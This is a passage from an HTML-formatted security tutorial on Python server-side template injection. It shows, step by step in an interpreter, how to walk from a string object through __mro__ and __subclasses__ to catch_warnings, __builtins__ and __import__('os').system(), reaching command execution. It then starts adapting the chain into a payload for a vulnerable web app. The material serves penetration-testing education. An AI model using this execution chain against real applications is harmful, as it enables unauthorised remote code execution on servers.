+<span class="token punctuation">[</span><span class="token string">'__add__'</span><span class="token punctuation">,</span> <span class="token string">'__class__'</span><span class="token punctuation">,</span> <span class="token string">'__contains__'</span><span class="token punctuation">,</span> <span class="token string">'__delattr__'</span><span class="token punctuation">,</span> <span class="token string">'__dir__'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__eq__'</span><span class="token punctuation">,</span> <span class="token string">'__format__'</span><span class="token punctuation">,</span> <span class="token string">'__ge__'</span><span class="token punctuation">,</span> <span class="token string">'__getattribute__'</span><span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">,</span> <span class="token string">'__getnewargs__'</span><span class="token punctuation">,</span> <span class="token string">'__gt__'</span><span class="token punctuation">,</span> <span class="token string">'__hash__'</span><span class="token punctuation">,</span> <span class="token string">'__init__'</span><span class="token punctuation">,</span> <span class="token string">'__init_subclass__'</span><span class="token punctuation">,</span> <span class="token string">'__iter__'</span><span class="token punctuation">,</span> <span class="token string">'__le__'</span><span class="token punctuation">,</span> <span class="token string">'__len__'</span><span class="token punctuation">,</span> <span class="token string">'__lt__'</span><span class="token punctuation">,</span> <span class="token string">'__mod__'</span><span class="token punctuation">,</span> <span class="token string">'__mul__'</span><span class="token punctuation">,</span> <span class="token string">'__ne__'</span><span class="token punctuation">,</span> <span class="token string">'__new__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce__'</span><span class="token punctuation">,</span> <span class="token string">'__reduce_ex__'</span><span class="token punctuation">,</span> <span class="token string">'__repr__'</span><span class="token punctuation">,</span> <span class="token string">'__rmod__'</span><span class="token punctuation">,</span> <span class="token string">'__rmul__'</span><span class="token punctuation">,</span> <span class="token string">'__setattr__'</span><span class="token punctuation">,</span> <span class="token string">'__sizeof__'</span><span class="token punctuation">,</span> <span class="token string">'__str__'</span><span class="token punctuation">,</span> <span class="token string">'__subclasshook__'</span><span class="token punctuation">,</span> <span class="token string">'capitalize'</span><span class="token punctuation">,</span> <span class="token string">'casefold'</span><span class="token punctuation">,</span> <span class="token string">'center'</span><span class="token punctuation">,</span> <span class="token string">'count'</span><span class="token punctuation">,</span> <span class="token string">'encode'</span><span class="token punctuation">,</span> <span class="token string">'endswith'</span><span class="token punctuation">,</span> <span class="token string">'expandtabs'</span><span class="token punctuation">,</span> <span class="token string">'find'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'format_map'</span><span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token string">'isalnum'</span><span class="token punctuation">,</span> <span class="token string">'isalpha'</span><span class="token punctuation">,</span> <span class="token string">'isascii'</span><span class="token punctuation">,</span> <span class="token string">'isdecimal'</span><span class="token punctuation">,</span> <span class="token string">'isdigit'</span><span class="token punctuation">,</span> <span class="token string">'isidentifier'</span><span class="token punctuation">,</span> <span class="token string">'islower'</span><span class="token punctuation">,</span> <span class="token string">'isnumeric'</span><span class="token punctuation">,</span> <span class="token string">'isprintable'</span><span class="token punctuation">,</span> <span class="token string">'isspace'</span><span class="token punctuation">,</span> <span class="token string">'istitle'</span><span class="token punctuation">,</span> <span class="token string">'isupper'</span><span class="token punctuation">,</span> <span class="token string">'join'</span><span class="token punctuation">,</span> <span class="token string">'ljust'</span><span class="token punctuation">,</span> <span class="token string">'lower'</span><span class="token punctuation">,</span> <span class="token string">'lstrip'</span><span class="token punctuation">,</span> <span class="token string">'maketrans'</span><span class="token punctuation">,</span> <span class="token string">'partition'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'rfind'</span><span class="token punctuation">,</span> <span class="token string">'rindex'</span><span class="token punctuation">,</span> <span class="token string">'rjust'</span><span class="token punctuation">,</span> <span class="token string">'rpartition'</span><span class="token punctuation">,</span> <span class="token string">'rsplit'</span><span class="token punctuation">,</span> <span class="token string">'rstrip'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'splitlines'</span><span class="token punctuation">,</span> <span class="token string">'startswith'</span><span class="token punctuation">,</span> <span class="token string">'strip'</span><span class="token punctuation">,</span> <span class="token string">'swapcase'</span><span class="token punctuation">,</span> <span class="token string">'title'</span><span class="token punctuation">,</span> <span class="token string">'translate'</span><span class="token punctuation">,</span> <span class="token string">'upper'</span><span class="token punctuation">,</span> <span class="token string">'zfill'</span><span class="token punctuation">]</span>
+</code></pre></div></div>
+<p>The next step is to understand Python's hierarchy. Using <code>__mro__</code> or <code>mro()</code>, we can go back up the tree of inherited objects in the Python environment. Let's practice this as follows.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__class__
+
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__
+
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakref'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakproxy'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NoneType'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedType'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'traceback'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keys'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_values'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_items'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversekeyiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversevalueiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reverseitemiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'odict_iterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'managedbuffer'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'stderrprinter'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'code'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frame'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
+ <span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
+ 
+ 
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'type'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakref'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakcallableproxy'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'weakproxy'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'int'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytearray'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'bytes'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'list'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NoneType'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'NotImplementedType'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'traceback'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'super'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'range'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_keys'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_values'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_items'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversekeyiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reversevalueiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'dict_reverseitemiterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'odict_iterator'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'set'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'str'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'slice'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'staticmethod'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'complex'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'float'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frozenset'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'property'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'managedbuffer'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'memoryview'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'tuple'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'enumerate'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'reversed'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'stderrprinter'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'code'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'frame'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'builtin_function_or_method'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'method'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
+ <span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
+</code></pre></div></div>
+<p>Now, let us look for useful classes that can facilitate remote code execution.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> x <span class="token operator">=</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">0</span> <span class="token builtin">type</span>
+<span class="token number">1</span> weakref
+<span class="token number">2</span> weakcallableproxy
+<span class="token number">3</span> weakproxy
+<span class="token number">4</span> <span class="token builtin">int</span>
+<span class="token number">5</span> <span class="token builtin">bytearray</span>
+<span class="token number">6</span> <span class="token builtin">bytes</span>
+<span class="token number">7</span> <span class="token builtin">list</span>
+<span class="token number">8</span> NoneType
+<span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">def</span> <span class="token function">searchfunc</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     x <span class="token operator">=</span> s<span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>mro<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             fn <span class="token operator">=</span> x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>__name__
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">if</span> fn<span class="token punctuation">.</span>find<span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                     <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> fn<span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> searchfunc<span class="token punctuation">(</span><span class="token string">'warning'</span><span class="token punctuation">)</span>
+
+<span class="token number">215</span> catch_warnings
+</code></pre></div></div>
+<p>Why are we searching for <code>warning</code> you may ask. We chose this class because it imports Python's <a href="https://github.com/python/cpython/blob/3.9/Lib/warnings.py#L3" target="_blank" rel="noopener nofollow">sys module</a> , and from <code>sys</code>, the <code>os</code> module can be reached. More precisely, os modules are all from <code>warnings.catch_</code>.</p>
+<p>Please note that you will probably come across a different number. Back to our Python for SSTI specifics, we have seen that <code>catch_warnings</code> is present without importing any additional module to our Python console. Let's enumerate the builtins from this class as follows.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> y <span class="token operator">=</span> x<span class="token punctuation">[</span><span class="token number">215</span><span class="token punctuation">]</span>
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> y
+
+<span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'warnings.catch_warnings'</span><span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> y<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__
+
+<span class="token punctuation">{</span><span class="token string">'__name__'</span><span class="token punctuation">:</span> <span class="token string">'builtins'</span><span class="token punctuation">,</span> <span class="token string">'__doc__'</span><span class="token punctuation">:</span> <span class="token string">"Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices."</span><span class="token punctuation">,</span> <span class="token string">'__package__'</span><span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'__loader__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__spec__'</span><span class="token punctuation">:</span> ModuleSpec<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'builtins'</span><span class="token punctuation">,</span> loader<span class="token operator">=</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'_frozen_importlib.BuiltinImporter'</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'__build_class__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function __build_class__<span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'__import__'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">__import__</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'abs'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">abs</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'all'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">all</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'any'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">any</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'ascii'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">ascii</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'bin'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">bin</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'breakpoint'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function breakpoint<span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'callable'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">callable</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'chr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">chr</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'compile'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">compile</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'delattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">delattr</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'dir'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">dir</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'divmod'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">divmod</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'eval'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">eval</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'exec'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token keyword">exec</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">format</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'getattr'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">getattr</span><span class="token operator">&gt;</span><span class="token punctuation">,</span> <span class="token string">'globals'</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">globals</span><span class="token operator">&gt;</span><span class="token punctuation">,</span>
+ <span class="token operator">&lt;</span>SNIP<span class="token operator">&gt;</span>
+
+
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> z <span class="token operator">=</span> y<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__
+<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> z<span class="token punctuation">:</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">if</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'import'</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>             <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> z<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>	
+<span class="token builtin">__import__</span> <span class="token operator">&lt;</span>built<span class="token operator">-</span><span class="token keyword">in</span> function <span class="token builtin">__import__</span><span class="token operator">&gt;</span>
+</code></pre></div></div>
+<p>It seems we have reached the import function by walking the hierarchy. This means we can load <code>os</code> and use the <code>system</code> function to execute code all coming from a string object, as follows.</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token punctuation">[</span><span class="token number">215</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>_module<span class="token punctuation">.</span>__builtins__<span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'echo RCE from a string object'</span><span class="token punctuation">)</span>
+RCE <span class="token keyword">from</span> a string <span class="token builtin">object</span>
+<span class="token number">0</span>
+</code></pre></div></div>
+<p>Returning to our vulnerable web application, let's see how we can repeat the same process and develop an RCE payload. Remember that the below payloads can be submitted to the application via the browser as is or via cURL after being URL encoded.</p>
+<p>Payload:</p>
+<div class="window_container"><div class="window_content"><div class="window_top">Code: <span class="text-success">python</span></div><pre class=" language-python"><code class=" language-python"><span class="token punctuation">{</span><span class="token punctuation">{</span> <span class="token string">''</span><span class="token punctuation">.</span>__class__ <span class="token punctuation">}</span><span class="token punctuation">}</span>
